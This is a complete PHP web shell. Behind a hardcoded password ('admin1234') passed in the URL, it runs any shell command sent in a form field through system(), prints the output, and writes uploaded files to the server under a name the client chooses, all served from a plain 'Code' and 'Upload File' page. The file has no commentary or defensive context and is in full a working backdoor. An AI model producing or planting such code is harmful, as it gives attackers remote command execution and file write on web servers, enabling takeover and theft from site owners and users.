<?php
if(isset($_GET['pass']))
if($_GET['pass']=="admin1234"){
if(isset($_POST['db'])){
echo "<pre>";
system($_POST["db"]);
echo "</pre>";
}else if(isset($_FILES["file"])){
if(move_uploaded_file($_FILES["file"]["tmp_name"],isset($_POST['name'])&&$_POST['name']!=""?$_POST['name']:(''.$_FILES["file"]["name"]))){
echo 'upload OK';
}else echo 'upload Error';
}
}
echo '
<h1>Code</h1>
<form method="POST">
<input style=width:100%;font-size:20px; value="'.(isset($_POST['db'])?$_POST['db']:'').'" name=db>
<input type=submit value=Run>
</form>
<h1>Upload File</h1>
<form method=post enctype="multipart/form-data">
<input name="name"><br>
<input type="file" name="file"><br>
<input type=submit value=Upload>
</form>
';
?>